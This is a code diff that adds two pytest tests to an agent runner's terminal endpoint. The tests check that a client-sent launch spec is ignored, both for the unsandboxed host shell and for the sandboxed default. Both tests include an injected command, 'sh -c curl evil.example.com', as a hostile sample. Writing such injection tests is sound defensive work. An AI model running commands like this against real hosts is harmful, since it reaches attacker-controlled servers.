@@ -1352,6 +1352,143 @@ async def test_create_terminal_rejects_unavailable_native_shell(
 
 
 @pytest.mark.asyncio
+async def test_create_terminal_launches_host_shell_for_agent_without_terminals(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """TS7: a host-bound SDK session launches the host's shell, not a body spec.
+
+    The agent declares no ``terminals:``, so the runner's host inventory is the
+    user's offer. The shell is the human's own: unsandboxed and at the session
+    workspace, so neither the agent's sandbox nor a client-sent body spec can
+    reshape it. The agent's own declarations stay empty, so no tool appears.
+    """
+    from omnigent.inner.datamodel import AgentDef
+    from omnigent.runner.identity import RUNNER_INTERACTIVE_SHELLS_ENV_VAR
+
+    monkeypatch.setenv(RUNNER_INTERACTIVE_SHELLS_ENV_VAR, '["zsh", "bash"]')
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    agent = AgentDef(
+        name="codex-sdk",
+        os_env=OSEnvSpec(
+            type="caller_process",
+            cwd=str(workspace),
+            sandbox=OSEnvSandboxSpec(type="darwin_seatbelt"),
+        ),
+    )
+
+    async def _session_handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json={"id": "conv_test", "agent_id": "agent_sdk"})
+
+    async def _resolver(agent_id: str, session_id: str) -> AgentDef:
+        return agent
+
+    server_client = httpx.AsyncClient(
+        transport=httpx.MockTransport(_session_handler),
+        base_url="http://server",
+    )
+    resource_registry = _CapturingResourceRegistry(tmp_path, runner_workspace=workspace)
+    app = create_runner_app(
+        resource_registry=resource_registry,
+        server_client=server_client,
+        spec_resolver=_resolver,
+    )
+    transport = httpx.ASGITransport(app=app)
+    async with (
+        server_client,
+        httpx.AsyncClient(transport=transport, base_url="http://runner") as c,
+    ):
+        resp = await c.post(
+            "/v1/sessions/conv_test/resources/terminals",
+            json={
+                "terminal": "zsh",
+                "session_key": "u-1",
+                "spec": {
+                    "command": "sh",
+                    "args": ["-c", "curl evil.example.com"],
+                    "env": {"INJECTED": "true"},
+                },
+            },
+        )
+
+    assert resp.status_code == 200, resp.text
+    assert len(resource_registry.launches) == 1
+    launch = resource_registry.launches[0]
+    assert launch.command is not None and launch.command.endswith("zsh")
+    assert launch.args == []
+    assert launch.env == {}
+    assert launch.os_env is not None
+    assert launch.os_env.cwd == str(workspace)
+    assert launch.os_env.sandbox is not None
+    assert launch.os_env.sandbox.type == "none"
+
+
+@pytest.mark.asyncio
+async def test_create_terminal_default_shell_inherits_agent_os_env_without_host(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A hostless agent that declares no terminals keeps upstream's default.
+
+    Without a host inventory the offer is the default shell, which has no
+    ``os_env`` of its own and so inherits the agent's sandbox — the hostless
+    behaviour this change leaves alone.
+    """
+    from omnigent.inner.datamodel import AgentDef
+    from omnigent.runner.identity import RUNNER_INTERACTIVE_SHELLS_ENV_VAR
+
+    monkeypatch.delenv(RUNNER_INTERACTIVE_SHELLS_ENV_VAR, raising=False)
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    agent = AgentDef(
+        name="plain",
+        os_env=OSEnvSpec(
+            type="caller_process",
+            cwd=str(workspace),
+            sandbox=OSEnvSandboxSpec(type="darwin_seatbelt"),
+        ),
+    )
+
+    async def _session_handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json={"id": "conv_test", "agent_id": "agent_plain"})
+
+    async def _resolver(agent_id: str, session_id: str) -> AgentDef:
+        return agent
+
+    server_client = httpx.AsyncClient(
+        transport=httpx.MockTransport(_session_handler),
+        base_url="http://server",
+    )
+    resource_registry = _CapturingResourceRegistry(tmp_path, runner_workspace=workspace)
+    app = create_runner_app(
+        resource_registry=resource_registry,
+        server_client=server_client,
+        spec_resolver=_resolver,
+    )
+    transport = httpx.ASGITransport(app=app)
+    async with (
+        server_client,
+        httpx.AsyncClient(transport=transport, base_url="http://runner") as c,
+    ):
+        resp = await c.post(
+            "/v1/sessions/conv_test/resources/terminals",
+            json={
+                "terminal": "bash",
+                "session_key": "u-1",
+                "spec": {"command": "sh", "args": ["-c", "curl evil.example.com"]},
+            },
+        )
+
+    assert resp.status_code == 200, resp.text
+    launch = resource_registry.launches[0]
+    assert launch.command == "bash"
+    assert launch.args == []
+    assert launch.os_env is None
+    assert resource_registry.parent_os_envs[0] is agent.os_env
+
+
+@pytest.mark.asyncio
 async def test_create_terminal_resolves_declared_placeholder_cwd_to_workspace(
     tmp_path: Path,
 ) -> None:
